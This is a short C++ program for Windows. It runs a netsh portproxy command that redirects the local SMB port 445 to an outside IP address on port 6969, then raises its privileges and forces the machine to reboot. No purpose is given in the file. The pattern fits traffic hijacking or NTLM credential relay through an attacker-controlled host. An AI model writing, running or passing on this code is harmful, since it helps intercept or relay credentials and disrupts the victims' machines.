//g++ -o your_program.exe your_program.cpp -static-libgcc -static-libstdc++ -static -lpthread


#include <iostream>
#include <cstdlib>
#include <windows.h>
#include<stdlib.h>

#define SE_SHUTDOWN_NAME L"SeShutdownPrivilege"

int main() {
    // Command to execute
    const char* command = "netsh interface portproxy add v4tov4 listenaddress=127.0.0.1 listenport=445 connectaddress=122.176.54.41 connectport=6969";

    // Execute the command
    int result = system(command);

    // Check the result of the command execution
    if (result == 0) {
        // Command executed successfully
        std::cout << "Command executed successfully." << std::endl;

        // Display a message
        std::cout << "Press Enter to restart Windows..." << std::endl;

    //Restart Windows
    // Requesting the necessary privileges
    HANDLE hToken;
    TOKEN_PRIVILEGES tkp;

    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
        MessageBoxW(NULL, L"Failed to open process token", L"Error", MB_OK | MB_ICONERROR);
        return 1;
    }

    LookupPrivilegeValueW(NULL, SE_SHUTDOWN_NAME, &tkp.Privileges[0].Luid);

    tkp.PrivilegeCount = 1;
    tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    AdjustTokenPrivileges(hToken, FALSE, &tkp, 0, (PTOKEN_PRIVILEGES)NULL, 0);

    if (GetLastError() != ERROR_SUCCESS) {
        MessageBoxW(NULL, L"Failed to adjust token privileges", L"Error", MB_OK | MB_ICONERROR);
        return 1;
    }

    // Restarting the system
    if (!ExitWindowsEx(EWX_REBOOT, SHTDN_REASON_MAJOR_OPERATINGSYSTEM | SHTDN_REASON_MINOR_RECONFIG)) {
        MessageBoxW(NULL, L"Failed to restart the system", L"Error", MB_OK | MB_ICONERROR);
        return 1;
    }

        // Wait for the user to press Enter
        std::cin.get();
    }

    return 0;
}
